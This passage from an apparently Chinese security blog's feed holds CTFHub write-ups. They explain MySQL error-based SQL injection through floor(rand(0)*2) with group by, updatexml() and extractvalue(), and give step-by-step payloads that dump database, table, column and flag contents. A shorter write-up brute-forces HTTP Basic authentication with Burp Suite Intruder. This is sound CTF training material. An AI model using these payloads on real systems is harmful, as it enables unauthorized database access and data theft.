NULL</p></blockquote><blockquote><p>floor()</p><p>对参数的数值进行向下取整，相当于去除小数点部分，保留整数</p></blockquote><blockquote><p>group by</p><p>用来结合聚合函数(这里和count一起使用)，根据一个或多个列对结果进行分组，后面演示的时候会具体介绍</p></blockquote><p>文字介绍还不如直接用数据库来演示一遍</p><p>附上参考链接：<a href="https://blog.51cto.com/wt7315/1891458">报错型sql注入原理分析</a></p><hr><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>首先是rand()函数，就是产生0~1的随机数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120928210.png" alt="image-20211012092818075"></p><p>如果是rand()*2，则取值范围就是：0*2~1*2，也就是<strong>0~2</strong></p><hr><h2 id="rand-amp-floor"><a href="#rand-amp-floor" class="headerlink" title="rand()&amp;floor()"></a>rand()&amp;floor()</h2><p>原本对rand()向下取整的话，floor(rand())恒为0，但是我们利用floor()对rand()*2进行向下取整，即floor(rand()*2)，则取值就变成了0或1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120934090.png" alt="image-20211012093445981"></p><p>在这里我们可以利用information_schema(MYSQL自带数据库)的schemata表来比较一下rand()*2和rand(0)*2的不同。(这里只是利用schemata表的行数来显示rand随机数，与表内容无关)</p><blockquote><p>rand()*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121554830.png" alt="image-20211012155445770"></p><blockquote><p>rand(0)*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121555785.png" alt="image-20211012155520718"></p><p>可以看到rand(0)*2确实是有规律的伪随机数，而rand()*2是没有规律的随机数，每次查询都是不同的顺序。因为rand(0)*2的确定性，所以<strong>SQL报错注入一般都用rand(0)*2(下面会讲)</strong></p><hr><h2 id="rand-amp-floor-amp-concat"><a href="#rand-amp-floor-amp-concat" class="headerlink" title="rand()&amp;floor()&amp;concat()"></a>rand()&amp;floor()&amp;concat()</h2><p>然后我们可以结合database()用来回显当前数据库的名称，concat()函数可以将多个字符串连接成一个字符串(如果有一个参数为null，则返回值为null)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name;   </span><br></pre></td></tr></table></figure><p><strong>0x开头表示十六进制，0x7e在十六进制中是”~”，concat后面加name用来对查询字段重命名为”name”</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120949887.png" alt="image-20211012094904821"></p><p>可以看到第一次查询拼接之后的字符串为”~~sql-error-inject~~0”，第二次查询拼接之后的字符串为”~~sql-error-inject~~1”。数据库为”sql-error-inject”，floor(rand()*2)的随机数第一次为0，第二次为1</p><p>我们可以利用information_schema的tables表来显示一下前面几列的具体内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121551760.png" alt="image-20211012155117571"></p><p>然后我们再用group by语句和聚合函数来对上述内容进行分组和统计求和。</p><p>这里要说一下group by和聚合函数的原理。</p><hr><h2 id="group-by-amp-聚合函数原理"><a href="#group-by-amp-聚合函数原理" class="headerlink" title="group by&amp;聚合函数原理"></a>group by&amp;聚合函数原理</h2><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/46869970">group by的理解</a></p><p>如果只使用group by语句，首先系统会根据SELECT语句得到一个结果集，然后根据分组字段，将具有相同分组字段的记录归并成一条记录，这个时候剩下的那些不存在于Group By语句后面作为分组依据的字段就有可能出现多个值，但是目前一种分组情况只有一条记录，一个数据格是无法放入多个数值的，所以这里就需要通过一定的处理将这些多值的列转化成单值，然后将其放在对应的数据格中，那么完成这个步骤的就是聚合函数</p><p>废话不多说，先拿图表来演示一遍</p><hr><p>首先存在一个表1：test</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121633095.png" alt="image-20211012163321047"></p><p>当我们在数据库中使用语句：FROM test Group By user，数据库会生成一个虚拟表，如下图所示。数据库会根据group by user，找到user字段，具有相同user值的行会合并成一行，没有相同值的就会自立一行。比如user值为jason的，&lt;1 jason 123&gt;和&lt;7 jason 789&gt;会合并成一行，user值为root的，&lt;2 root 123&gt;、&lt;4 root 456&gt;、&lt;8 root 123&gt;会合并成一行，其中id值和password值会写到一个单元格里面。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121649689.png" alt="image-20211012164935607"></p><p>虽然画得挺丑，但是通俗易懂(牛批)从上图可以看出，通过user字段合并相同值之后，虚拟表总共有五行。</p><p>接下来数据库会针对虚拟表进行SELECT语句：</p><ol><li><p>如果执行select *，有些单元格里面id字段和password字段的内容有多个值，但是数据库中不允许单元格有多个值，所以在数据库里面执行select *语句会报错。</p></li><li><p>因为user字段的每个单元格只有一条数据，所以执行select  user是没有问题的。至于为什么user字段的每一个单元格只有一个值，是因为我们就是用user字段来group by(分组)的</p></li><li><p>对于id和password里面的有多个数据的单元格，办法就是使用聚合函数，<strong>聚合函数用来输入多个数据，输出一个数据</strong>，比如count(id)，sum(password)</p></li><li><p>比如当我们执行select user,count(id) as c from test group by user，那么数据库根据group by后面的user字段进行分组，然后count(id)就会对虚拟表中的id字段的每个单元格进行count操作，比如user字段为jason的，虚拟表中属于jason那行的id有两个：1和7，所以返回的将会是2(<strong>计算属于jason的id的个数</strong>)，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121719520.png" alt="image-20211012171907436"></p></li></ol><hr><h2 id="group-by-amp-聚合函数"><a href="#group-by-amp-聚合函数" class="headerlink" title="group by&amp;聚合函数"></a>group by&amp;聚合函数</h2><p>接下来我们就可以把group by和聚合函数一起应用到上述SQL语句里面了</p><p>首先我们不用聚合函数，看一下group by对name会分成多少组，按理来说根据floor(rand()*2)随机取值的不同会分成两组(取值为0或1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121736474.png" alt="image-20211012173619402"></p><p>没错，确实分成了两组</p><p>那我们尝试把count()聚合函数加进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121742362.png" alt="image-20211012174229264"></p><p>说明执行之后计算得到字符串为”~~sql-error-inject~~1”的数量有157个，为”~~sql-error-inject~~0”的有169个</p><p>那我们再执行一遍</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121910574.png" alt="image-20211012191040411"></p><p>咳咳，虽然已经报错了，但是…这tm算什么报错！！我要的报错数据呢！(虽然确实提示了键值冲突)</p><p>然后这里换做rand(0)*2，一顿无脑疯狂执行(<strong>~~笑死~~</strong>)<strong>这里使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错(下面真的会讲)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121927712.png" alt="image-20211012192737602"></p><p>看看别人的报错…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121914664.png" alt="image-20211012191430557"></p><p>确实应该会有报错提示数据库的名字出来…目测是我的MYSQL版本太高了，我的MYSQL版本是8.0</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121916712.png" alt="image-20211012191658661"></p><p>百度了一下，确实是版本的问题，新版MYSQL8.x不适用这个floor让group by重复的这个报错注入了</p><p>参考链接<a href="https://blog.csdn.net/Cypher_X/article/details/119909526">group by主键重复适用版本</a></p><p>可恶啊…这算什么，那最后只能再解释一下报错原因了</p><h2 id="SQL报错原因"><a href="#SQL报错原因" class="headerlink" title="SQL报错原因"></a>SQL报错原因</h2><p>MYSQL官方给过提示，查询时如果用rand()，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果<strong>虚表不存在记录</strong>，插入虚表的时候会再被执行一次，我们先来看rand(0)*2的规律：<strong>011011</strong>。正是因为这个规律，所以刚才疯狂报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand(0)*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121937304.png" alt="image-20211012193742244"></p><p>来根据上面rand(0)*2的规律，来总结一下报错原因：</p><div class="note green icon simple"><i class="note-icon fas fa-bullhorn"></i><ol><li>查询的时候数据库会建立一个虚拟表</li><li>第一条记录执行floor(rand(0)*2)，<strong>第一次计算</strong>发现结果为0，查询虚拟表，0的键值不存在(说明虚表不存在0键值的记录)，则floor(rand(0)*2)会被再计算一次，结果为1(<strong>第二次计算</strong>)，插入虚表(此时插入的是1键值)</li><li>第二条记录执行floor(rand(0)*2)，<strong>第三次计算</strong>发现结果为1，查询虚拟表，1的键值存在，所以floor(rand(0)*2)不会被计算第二次，count(*)加1</li><li>第三条记录执行floor(rand(0)*2)，<strong>第四次计算</strong>发现结果为0，查询虚拟表，0的键值不存在，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，准备作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li><li>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以数据表中的行需要3条数据(注意，是数据表的行至少要有三行而不是五行，并不是要有第四第五行数据，rand(0)*2才会计算，以上的第四第五行只是为了显示第四个rand(0)*2和第五个rand(0)*2的随机值是多少)，使用该语句才会报错</li></ol></div><h2 id="floor-rand-2-报错"><a href="#floor-rand-2-报错" class="headerlink" title="floor(rand()*2)报错"></a>floor(rand()*2)报错</h2><p><strong>所以为什么使用rand(0)*2每次执行都会报错，而用rand()*2的话并不是每次执行都会报错？</strong>由于没加入随机因子，所以floor(rand()*2)是不可测的，因此在有三条数据以上的时候，不含有随即因子的rand()*2只要出现下面情况，即可报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121952461.png" alt="image-20211012195232380"></p><p>前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()*2)不会再被计算做为虚表的键值，这也就是为什么不加随机因子有时候会报错，有时候不会报错的原因。</p><h1 id="CTFHub-SQL报错注入之floor"><a href="#CTFHub-SQL报错注入之floor" class="headerlink" title="CTFHub-SQL报错注入之floor()"></a>CTFHub-SQL报错注入之floor()</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SQL注入-&gt;报错注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>查看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020803.png" alt="image-20211012202031726"></p><p>按要求输入一个1试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020046.png" alt="image-20211012202051962"></p><p>返回查询正确，但是什么数据都没有回显到页面中，输入1’试试</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122021286.png" alt="image-20211012202152193"></p><p>好像又多了个单引号，说明可能是一个整型输入id，所以尝试直接用order by查看字段有多少个，输入：1 order by 2</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122024944.png" alt="image-20211012202407849"></p><p>虽然没有语法错误，显示查询正确，但还是没有数据回显，可能是SQL报错注入(题目上已经写了，但是我就是装瞎)</p><p>那就使用前面讲到的floor()函数来进行报错注入</p><div class="note warning simple"><p>需要注意的是这里的union联合查询中，要让前一个SQL语句成立，后一个SQL语句才能把内容报错到页面中，所以这里和下面的id=1</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select database()),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122020101.png" alt="image-20211012202005984"></p><p>显示当前数据库为sqli，再爆表名(<mark class="hl-label red">不能用group_concat,而且要加limit</mark> )</p><blockquote><p>不加limit</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141717512.png" alt="image-20211014171737376"></p><p>会提示查询超过一行，所以我们还是加limit吧</p><blockquote><p>加limit</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122031167.png" alt="image-20211012203143964"></p><p>再爆字段(这里字段名和表名都是flag)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141700472.png" alt="image-20211014170042137"></p><p>然后爆字段的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select flag from sqli.flag),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122033900.png" alt="image-20211012203338755"></p><p>拿到flag啦！！耶！</p><h1 id="CTFHub-SQL报错注入之updatexml"><a href="#CTFHub-SQL报错注入之updatexml" class="headerlink" title="CTFHub-SQL报错注入之updatexml()"></a>CTFHub-SQL报错注入之updatexml()</h1><h2 id="updatexml-函数解析"><a href="#updatexml-函数解析" class="headerlink" title="updatexml()函数解析"></a>updatexml()函数解析</h2><p>updatexml()函数是用来更新xml文档的函数，其语法为：updatexml(xml文档对象名称，xml路径，更新内容)</p><p>UPDATEXML (XML_document, XPath_string, new_value); </p><p>然后主要是第二个参数。第二个参数的正确用法应该是xpath格式的字符串，即’/xxx/xxx/xxx’这种格式，但是如果我们输入的参数不符合该规范，就会把报错内容显示出来。</p><div class="note warning simple"><p>updatexml的最大长度是32位，所以报错内容有时候显示不完整，需要用mid()函数或者其它函数来显示剩余的部分</p></div><p>对此，我们可以构造的有关updatexml()报错注入的SQL语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><p>其中，database()的位置用来替换对应的查询语句。而updatexml的第一个参数和第三个参数可以随便填写，主要是利用第二个参数来进行报错注入。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191909949.png" alt="image-20211019190902811"></p><p>提示XPATH语法错误，并且提示了错误信息</p><p>爆表名</p><blockquote><p>这里可以用group_concat，只是floor()函数不可用而已</p><p>后面的sqli必须加引号当作字符串，否则会提示找不到该字段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191913321.png" alt="image-20211019191321241"></p><p>得到flag的表，然后爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191914872.png" alt="image-20211019191442804"></p><p>得到flag字段，所以可以直接爆sqli.flag的字段flag里的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191917890.png" alt="image-20211019191729806"></p><p>因为updatexml的最大长度是32位，这里的flag加上前面的~(0x7e)总共32位，所以显示的flag有31位，要想显示剩下的flag的内容，这里用mid()函数</p><blockquote><p><code>MID()</code>函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段。</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）。</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>因为已经显示31位flag字符，所以我们只需要从第32位字符开始提取就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select flag from sqli.flag),32),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191924790.png" alt="image-20211019192437694"></p><p>啊哈~可以看到第32位字符已经显示出来了，原来flag刚好有32位字符!!</p><div class="note red icon modern"><i class="note-icon fas fa-exclamation-circle"></i><p>这里会有人想：早知道concat的时候不在前面加0x7e了，这样刚好显示32位完整的flag</p><p>这个想法是错误的！！</p></div><p>这里演示一下concat()函数中的参数(select flag from sqli.flag)的前面不加0x7e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat((select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191933760.png" alt="image-20211019193322693"></p><p>并没有显示完整的flag，那是不是前后都不加0x7e，就会显示完整的flag了？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat((select flag from sqli.flag)),1)</span><br><span class="line">1 and updatexml(1,(select flag from sqli.flag),1)        //两条语句相同意思，报了相同的错误，但还是不会显示完整flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191941765.png" alt="image-20211019194145640"></p><p>好吧还是没有显示完整的flag，不过因为flag字符个数就是32位左右，所以其实可以不用mid()函数，直接像上述中不加0x7e就可以显示后面剩下的字符了，不过如果需要显示更长一点的内容，就不得不用到mid()函数了</p><h1 id="CTFHub-SQL报错注入之extractvalue"><a href="#CTFHub-SQL报错注入之extractvalue" class="headerlink" title="CTFHub-SQL报错注入之extractvalue()"></a>CTFHub-SQL报错注入之extractvalue()</h1><h2 id="extractvalue-函数解析"><a href="#extractvalue-函数解析" class="headerlink" title="extractvalue()函数解析"></a>extractvalue()函数解析</h2><p>extractvalue()函数是用来查询xml文档的函数，从目标XML中返回包含所查询值的字符串。其语法为：extractvalue(xml文档对象名称，xml路径)</p><p>EXTRACTVALUE (XML_document, XPath_string);</p><p>所以其实和updatexml()差不多，还是利用extractvalue()函数中的第二个参数来构造payload。下面的解题内容聪明的可以略过了~</p><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191956246.png" alt="image-20211019195655149"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191957088.png" alt="image-20211019195757011"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191958990.png" alt="image-20211019195846791"></p><p>爆内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select flag from sqli.flag),32),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191959300.png" alt="image-20211019195932220"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110192001150.png" alt="image-20211019200127061"></p>]]></content>
      
      
      <categories>
          
          <category> CTFHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub-HTTP基础认证</title>
      <link href="/2021/09/29/ctfhub-http-basic/"/>
      <url>/2021/09/29/ctfhub-http-basic/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-基础认证"><a href="#CTFHub-基础认证" class="headerlink" title="CTFHub-基础认证"></a>CTFHub-基础认证</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;Web前置技能-&gt;HTTP协议-&gt;基础认证</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>我靠…这么简单的题也好意思写博客…嘻嘻嘻，我就爱！</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291349515.png" alt="image-20210929114332527"></p><p>首先给了一个地址和一个题目附件，我们先去地址看一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144825.png" alt="image-20210929114434729"></p><p>有个click链接，点进去会有提示要求你输入用户名和密码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144968.png" alt="image-20210929114453896"></p><p>然后我们再打开题目给的附件，可以看到文件名<mark class="hl-label red">可能</mark> 意思就是：一千万个密码中最热门的100个密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291143423.png" alt="image-20210929114355318"></p><p>那好吧，密码字典已经给出来了，大概意思就是密码爆破咯。我们可以先尝试随便输入用户名和密码，然后利用<strong>Burp Suite</strong>进行抓包</p><div class="note info no-icon flat"><p>用户名：111</p><p>密码：123</p></div><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291145254.png" alt="image-20210929114540150"></p><p>可以看到中间有一个Authorization:Basic 阿巴阿巴</p><p>“Basic”就是”基础”的意思，对应题目的”基础认证”</p><p>咦？阿巴阿巴后面居然有两个等号</p><p>Base64解码一下咯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146786.png" alt="image-20210929114621674"></p><p>右键-&gt;转换选择-&gt;Base64-&gt;Base64解码</p><p>英文版的Burp Suite自己琢磨(我tm四级没过)</p><p>解出来如下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146081.png" alt="image-20210929114650979"></p><p>发现是自己输入的用户名和密码，中间冒号隔开，发送请求的时候Base64编码了</p><p>先不管，把请求包右键发送到重发器(REpeater)然后发送</p><h3 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291149872.png" alt="image-20210929114938674"></p><p>有提示！可以看到服务器的响应头里面有：”Do u know admin？”</p><p>所以用户名应该是admin</p><p>到这里可以用脚本对用户名和密码文件里的密码整合起来进行base64编码后爆破了</p><p>但是这里我比较菜，不会写脚本，所以用了个还算平民的方法(简单简单简单！)</p><h2 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h2><p>用Notepad++打开密码txt文件</p><p>Ctrl+H打开搜索替换</p><p>利用正则表达式，统一把”admin:”加在100个密码的前面</p><p>^表示行首，意思就是在每行行首凭空添加”admin:”，记得在下面把Search Mode中的Regular expression(正则表达式)选中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291158620.png" alt="image-20210929115801503"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291156520.png" alt="image-20210929115659396"></p><h2 id="Burp-Suite-Intruder"><a href="#Burp-Suite-Intruder" class="headerlink" title="Burp Suite(Intruder)"></a>Burp Suite(Intruder)</h2><p>替换好之后回到Burp Suite，右键把数据包发送到测试器(Intruder),然后点击Positions，选中已经被Base64编码的那一串字符，做一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291159870.png" alt="image-20210929115903743"></p><p>点击Positions右边的Payloads</p><p>添加我们的”用户名:密码”到有效载荷选项中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291204348.png" alt="image-20210929120446192"></p><p>然后发现了一个不重要的信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291205540.png" alt="image-20210929120512461"></p><p>为什么密码有101个！不是100个嘛！</p><p>经过我名侦探般的推理，后来发现是本来的密码文件的最后面多了个换行，导致添加”admin:”到密码文件的时候识别到最后一行的行首，所以在后面就多了一个”admin:”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291327824.png" alt="image-20210929132723779"></p><p>无关紧要，添加完密码文件后，在下面有效负载处理这边添加一个Base64编码规则</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291319193.png" alt="image-20210929131946082"></p><p>就是把密码文件中的字符先用Base64编码，然后再爆破</p><p>再往下拉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291320654.png" alt="image-20210929132036581"></p><p>防止base64编码后的=号被URL编码</p><p>然后就可以右上角开始攻击了！</p><p>结束后点击长度排序一下，可以看到长度不同的有效载荷，就是正确的用户名和密码啦！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291423106.png" alt="image-20210929142357974"></p><p>然后双击，就可以在下方的Response中看到flag</p><p>也可以直接复制这串base64放到数据包中的对应位置，然后放行数据包，就可以在网页上看到flag了！</p><p>也可以先解码一下，得到正确密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291323241.png" alt="image-20210929132353144"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291324570.png" alt="image-20210929132402515"></p><p>然后再重新返回页面输入正确的用户名和密码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291325922.png" alt="image-20210929132508810"></p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p>总结：</p><ol><li>填写用户名密码，然后用Burp 